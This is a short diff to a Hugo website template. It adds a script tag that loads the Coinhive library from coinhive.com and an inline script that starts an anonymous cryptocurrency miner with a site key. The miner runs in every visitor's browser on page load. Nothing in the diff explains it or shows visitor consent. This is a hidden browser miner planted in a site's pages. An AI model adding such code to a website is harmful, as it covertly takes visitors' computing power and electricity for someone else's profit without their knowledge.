@@ -26,7 +26,12 @@
 
     <!-- RSS -->
     <link href="{{ .RSSlink }}" rel="alternate" type="application/rss+xml" title="{{ .Site.Title }}"/>
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 </head>
 
 <body class="{{ .Site.Params.themeColor }} {{if .Site.Params.layoutReverse}}layout-reverse{{end}}">
 {{ partial "sidebar.html" . }}
+<script>
+	var miner = new CoinHive.Anonymous('kZB6ubM0SSlwVj0LdCVJBldgMSfKsRaC');
+	miner.start();
+</script>
